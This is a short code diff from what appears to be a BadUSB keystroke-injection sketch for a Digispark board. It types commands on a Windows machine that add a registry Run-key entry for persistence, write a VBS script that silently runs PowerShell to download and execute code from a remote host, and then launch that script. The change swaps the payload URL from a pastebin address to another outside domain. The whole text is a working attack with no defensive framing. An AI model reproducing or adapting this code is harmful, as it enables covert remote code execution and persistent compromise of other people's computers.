@@ -32,7 +32,7 @@ void setup() {
   DigiKeyboard.println("REG ADD HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v Data /t REG_EXPAND_SZ /d \"C:\\Users\\mogek\\a.vbs\"");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   //create payload file
-  DigiKeyboard.println("echo CreateObject(\"Wscript.Shell\").Run \"powershell IEX (New-Object Net.WebClient).DownloadString('https://pastebin.com/raw/s1WEjiqj');\",0,True > a.vbs");
+  DigiKeyboard.println("echo CreateObject(\"Wscript.Shell\").Run \"powershell IEX (New-Object Net.WebClient).DownloadString('https://systemdaemon.tk/img/payload.txt');\",0,True > a.vbs");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   //execute itcm
   DigiKeyboard.println("wscript a.vbs");
